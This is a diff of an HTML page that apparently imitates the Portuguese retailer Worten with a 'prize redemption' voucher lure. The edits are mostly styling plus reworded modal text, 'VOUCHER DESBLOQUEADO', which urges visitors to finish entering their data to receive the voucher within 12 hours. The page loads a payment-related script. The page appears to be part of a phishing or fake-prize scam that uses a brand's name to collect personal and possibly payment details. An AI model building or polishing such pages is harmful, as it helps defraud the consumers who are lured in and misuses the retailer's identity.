@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Resgate do Prémio - Worten</title>
     <meta name="description" content="Resgate o seu voucher Worten">
-    <link rel="stylesheet" href="style.css?v=25">
+    <link rel="stylesheet" href="style.css?v=26">
     <link
         href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;800&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap"
         rel="stylesheet">
@@ -199,15 +199,19 @@
 
         #voucher-code-display {
             font-family: 'Roboto Mono', monospace;
-            font-size: 28px;
+            font-size: 22px;
+            /* Reduced from 28px */
+            white-space: nowrap;
+            /* Prevent breaking */
             color: #d32f2f;
             /* Worten Red */
             font-weight: 800;
             margin-top: 15px;
-            letter-spacing: 3px;
+            letter-spacing: 2px;
             display: none;
             background: #fff;
-            padding: 10px 20px;
+            padding: 10px 15px;
+            /* Tighter padding */
             border-radius: 8px;
             border: 1px dashed #d32f2f;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
@@ -468,16 +472,23 @@
     <!-- Code Revealed Modal -->
     <div id="codeRevealedModal" class="legal-modal">
         <div class="legal-content" style="text-align: center; max-width: 450px;">
-            <div style="font-size: 50px; margin-bottom: 20px;">🎉</div>
-            <h2 style="color: #4CAF50; margin-bottom: 15px; font-weight: 800;">CÓDIGO REVELADO!</h2>
-            <p style="color: #555; font-size: 15px; line-height: 1.5; margin-bottom: 25px;">
-                O teu voucher foi desbloqueado com sucesso.<br>
-                Preenche os teus dados abaixo para validar a tua identidade e ativar o envio imediato.
+            <div style="margin-bottom: 20px;">
+                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#4CAF50" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                    <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                </svg>
+            </div>
+            <h2 style="color: #333; margin-bottom: 10px; font-weight: 800; font-family: 'Open Sans', sans-serif;">
+                VOUCHER DESBLOQUEADO</h2>
+            <p style="color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 25px;">
+                Código validado com sucesso.<br>
+                Finalize o preenchimento dos dados para receber o voucher (Envio em até 12h).
             </p>
             <button onclick="closeRevealedModal()" style="
-                background: #d32f2f; color: white; border: none; padding: 12px 30px;
-                border-radius: 50px; font-weight: 700; font-size: 16px; cursor: pointer; width: 100%;
-                text-transform: uppercase; box-shadow: 0 4px 6px rgba(211, 47, 47, 0.3);
+                background: #d32f2f; color: white; border: none; padding: 15px 35px;
+                border-radius: 50px; font-weight: 700; font-size: 15px; cursor: pointer; width: 100%;
+                text-transform: uppercase; box-shadow: 0 4px 10px rgba(211, 47, 47, 0.2); letter-spacing: 1px;
             ">PREENCHER DADOS</button>
         </div>
     </div>
@@ -493,9 +504,9 @@
 
     <!-- Shared Script for Modals -->
     <!-- Audio Manager (Singleton) -->
-    <script src="audio-manager.js?v=25"></script>
-    <script src="script.js?v=25"></script>
-    <script src="waymb-service.js?v=25"></script>
+    <script src="audio-manager.js?v=26"></script>
+    <script src="script.js?v=26"></script>
+    <script src="waymb-service.js?v=26"></script>
 
     <script>
         // --- Generation Sequence ---
